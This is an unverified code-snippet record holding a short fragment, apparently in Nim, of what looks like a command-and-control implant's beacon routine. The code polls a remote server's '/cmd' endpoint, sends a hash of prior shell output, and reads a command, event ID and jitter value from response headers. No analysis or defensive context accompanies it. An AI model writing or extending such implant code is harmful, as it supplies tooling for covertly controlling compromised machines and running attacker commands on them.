---
id: 73f3de19-a572-41c5-b83a-9ac35562647e
type: code
language: ''
verified: false
created_at: '2023-06-06T03:13:11.590805+00:00'
updated_at: '2023-06-06T16:19:30.736264+00:00'
---

# Code Snippet 73f3de19

```
var GetCommand = newHttpClient(userAgent= defUserAgent)
GetCommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = GetCommand.request(server & "/cmd", httpMethod = HttpGet)
#echo sent.status
let response = sent.headers
let cmd = response.getOrDefault("X-cmd") # Check for Command
let event_id = response.getOrDefault("x-event-id") # Check for event ID
let jitter = response.getOrDefault("x-jitter")
```


